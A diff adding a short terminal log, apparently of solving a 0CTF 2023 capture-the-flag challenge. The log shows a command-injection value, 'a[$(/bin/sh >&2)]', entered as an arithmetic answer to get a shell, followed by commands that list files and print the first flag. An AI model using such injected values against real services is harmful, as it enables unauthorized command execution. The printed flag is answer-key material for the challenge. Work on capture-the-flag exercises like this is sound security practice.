@@ -1,0 +1,34 @@
+% nc -X connect -x instance.0ctf2023.ctf.0ops.sjtu.cn:18081 e2qfqq84hgxg376c 1
+You are now in the math examination hall.
+First, please read exam integrity statement:
+
+I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment
+
+Now, write down the exam integrity statement here:
+I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment
+All right
+
+Exam starts
+(notice: numbers in dec, oct or hex format are all accepted)
+
+Problem 1 of 100:
+1 + 1 = ?
+a[$(/bin/sh >&2)]
+ls
+bin
+etc
+flag1
+lib
+lib64
+server
+cat flag1
+################################################################################
+##
+## Yeah! You find the first flag:
+##  
+## flag{7c3798475c4cfdac8101cb91c906e7a1}
+##
+## But stop here, hacker! You should not see this file!
+## And I won't tell you where the second flag is!
+## 
+################################################################################
